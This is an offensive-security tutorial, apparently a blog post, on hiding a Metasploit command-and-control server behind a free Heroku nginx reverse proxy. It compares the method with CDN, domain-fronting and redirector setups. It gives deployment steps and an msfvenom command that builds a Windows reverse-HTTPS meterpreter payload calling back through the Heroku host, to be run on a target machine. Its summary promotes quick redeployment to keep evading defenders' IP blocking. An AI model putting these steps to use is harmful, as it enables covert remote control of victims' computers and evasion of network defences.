---
title: Hide C2 Server Using Heroku (Simple/Zero Cost)
description: Learn how to hide your Metasploit Framework C2 server using Heroku - a simple and zero-cost solution compared to domain fronting, CDN, and redirector methods.
cover: /img/utilize_heroku_to_hide_c2_server_simple_zero_cost/1.webp
---

# Hide C2 Server Using Heroku (Simple/Zero Cost)

# Preface

This article introduces how to use Heroku to achieve the hiding of C2 services in the metasploit-framework. Compared with the three popular methods of "domain fronting", "CDN",
and "redirection" in the industry for hiding C2, the method introduced in this article is simple to operate and has lower costs (whether it is time cost or financial cost) in the
process of confrontation with "threat intelligence" and "IP blocking".

# Currently Popular C2 Hiding Technologies

"Domain fronting", "CDN", and "redirection" [](https://me.csdn.net/qq_41874930) are the three currently popular C2 hiding technologies. Shanfenglan7 has made a very detailed
explanation in his
article [The Differences in Hiding C2 Using Three Technologies of CDN, Domain Fronting, and Redirection](https://blog.csdn.net/qq_41874930/article/details/109008708). The author
found through actual testing of the three technologies that each technology has some shortcomings.

## Hiding C2 with CDN

The preparatory work for hiding C2 using CDN is roughly as follows:

+ Need to purchase a domain name (you can use a free one through [https://www.freenom.com/](https://www.freenom.com/))
+ Need to purchase CDN services (you can use the free [https://www.cloudflare.com/](https://www.cloudflare.com/))
+ Need to modify DNS records at the CDN service provider
+ Need to wait for the DNS records to take effect (if your domain name is bound to other IPs, this operation requires several hours)

It can be seen that although zero cost can be achieved by combining free services, there are many configuration operations required during the implementation process, and the time
cost and mental cost are too high. If the domain name is not registered anonymously, there is a risk of being traced and sourced.

## Hiding C2 with Domain Fronting

The preparatory work for hiding C2 using domain fronting is roughly as follows:

+ Need to purchase a domain name (you can use a free one through [https://www.freenom.com/](https://www.freenom.com/))
+ Need to purchase CDN services (you can use the free [https://www.cloudflare.com/](https://www.cloudflare.com/))
+ Need to modify DNS records at the CDN service provider
+ Need to wait for the DNS records to take effect (if your domain name is bound to other IPs, this operation requires several hours)
+ Need to know other high-reputation domain names or IPs on the CDN
+ Need to modify the malleable profile file

Domain fronting requires more additional operations than CDN, and the current mainstream CDN service providers have begun to block domain fronting technology.

## Hiding C2 with Redirection

The preparatory work for hiding C2 using redirection is roughly as follows:

+ Need two VPS
+ Use apache or nginx to configure redirection forwarding
+ Need to modify the malleable profile file

Redirection requires some additional encoding and deployment work, and it also needs to expose the IP address of one VPS to "threat intelligence", which may be traced back, and in
fact, the goal of hiding C2 has not been achieved.

# Hiding C2 Server Using Heroku

Heroku is a cloud platform as a service that supports multiple programming languages. Simply put, it can deploy docker containers for free and open web services to the Internet.
The following are the operation steps.

+ First, register a Heroku account. Click to register an account through [https://dashboard.heroku.com](https://dashboard.heroku.com/) (it is recommended to use gmail).
+ After successful registration, log in. After logging in, click on
  the [deployment link](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku).
+ Fill in the app name as "mydiydomain" (it can be customized. The name is the prefix of the subsequent domain name), and fill in the TARGET environment variable as the C2 handler
  address.

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\1.webp)

+ Then click "Deploy app" and the system will deploy automatically.
+ Add a handler in the metasploit-framework and configure as shown in the figure.

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\2.webp)![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\3.webp)

+ Execute "to_handler" to generate a listener.
+ Use the following command to generate a payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=mydiydomain.herokuapp.com LPORT=443 -f exe -o ~/payload.exe
```

+ Upload and run it on the target machine.

# Running Effect

+ View the session in the metasploit-framework as follows. It can be seen that the link address of the session is the heroku transit server address.

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\4.webp)

+ The packet capture effect on the target machine is as follows:

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\5.webp)

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\6.webp)

![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\7.webp)

# Summary

From a technical perspective, hiding C2 with Heroku is very simple. Use the Heroku service to deploy an nginx reverse proxy service. The payload connects to Heroku's nginx, and
nginx forwards the traffic to C2. The specific advantages are as follows:

+ Only need to register a free Heroku account.
+ No need to register or purchase a domain name.
+ It comes with a trusted SSL certificate (the Heroku domain comes with a certificate).
+ If the IP address is blocked, you can delete the original Heroku app and redeploy the Heroku app (about 30s), and continuously confront the defenders.
+ The operation steps are simple.